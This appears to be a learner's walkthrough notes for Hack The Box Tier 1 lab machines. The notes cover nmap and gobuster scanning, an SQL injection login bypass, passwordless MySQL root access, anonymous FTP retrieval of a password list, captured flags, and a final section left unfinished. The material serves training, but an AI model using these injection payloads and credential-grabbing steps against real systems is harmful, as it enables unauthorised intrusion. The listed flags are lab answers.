# TIER 1 STARTING POINT BOXES

--------------------------------------------------------------------

**TOOLS USED**: nmap, gobuster

**nmap**: network exploration tool and security / port scanner<br>

```
nmap [Scan Type...] [Options] {target specification}
```

Scan Types:<br>
-Ss [DEFAULT] TCP SYN Scan (Doesn't open full TCP connection)<br>
-St TCP Scan (Opens full TCP connection)<br>
-Su UDP Scan<br>

**gobuster**: tool to brute force URIs (dirs, files, dns subdomains)

```
gobuster [command]
```

--------------------------------------------------------------------

## APPOINTMENT BOX

**TOOLS USED**: nmap, gobuster

**IP Address**: 10.129.182.2

```
nmap -sC -sV -p- -oN appointment_nmap.txt 10.129.182.2
```

**EXPOSED PORT (SERVICE)**: 80 (http)

```
gobuster dir -u 10.129.182.2 -w /usr/share/dirb/wordlists/common.txt
```

10.129.182.2/js has a js file which shows we can do SQL injection

SQL Validation Query: SELECT * FROM users WHERE name=' ' and password=' '

user: ' or '1'='1 <br>
password: ' or '1'='1 <br>

FLAG: e3d0796d002a446c0e622226f42e9672

--------------------------------------------------------------------

## SEQUEL BOX

**TOOLS USED**: nmap

**IP Address**: 10.129.49.167

```
nmap -sV -sC -T2 -oN sequel_nmap.txt 10.129.49.167
```

**EXPOSED PORT (SERVICE)**: 3306 (mysql)

```
mysql -h 10.129.49.167 -u root
```

```
show databases;
use htb;
show tables;
select * from config, users;
```

FLAG: 7b4bec00d1a39e3dd4e021ec3d915da8

--------------------------------------------------------------------

## CROCODILE BOX

**TOOLS USED**: nmap, gobuster

**IP Address**: 10.129.54.45

```
nmap -sV -sC -T2 -oN crocodile_nmap.txt 10.129.54.45
```

**EXPOSED PORT (SERVICE)**: 21 (ftp), 80 (http)

Anonymous FTP login allowed (FTP code 230)<br>
user:anonymous

```
get allowed.userlist
get allowed.userlist.passw
```

user of interest from allowed.userlist: admin

run wappalyzer browser extension to find website is using php

```
gobuster dir -u http://10.129.54.45 -w /usr/share/dirb/wordlists/common.txt  -x php,html
```

-x: specifies what file types to search for

hidden dir: /login.php

user: admin<br>
password: rKXM59ESxesUFHAd<br>
manually brute forced login

FLAG: c7110277ac44d78b6a9fff2232434d16

--------------------------------------------------------------------

## RESPONDER BOX

**TOOLS USED**: nmap

**IP Address**: 10.129.97.135

```
nmap -sV -sC -oN responder_nmap.txt 10.129.97.135
```

**EXPOSED PORT (SERVICE)**:<bvr>
80 (http),<br>
5985 (http),<br>
7680 (pando-pub)

Port 5985 is WRM (Windows Remote Management) over http

Add "10.129.97.135 unika.htb" to /etc/hosts file because 10.129.97.135 redirects to unika.htb

```
gobuster dir -u http://10.129.97.135 -w /usr/share/dirb/wordlists/common.txt -x php,html
```

FLAG:
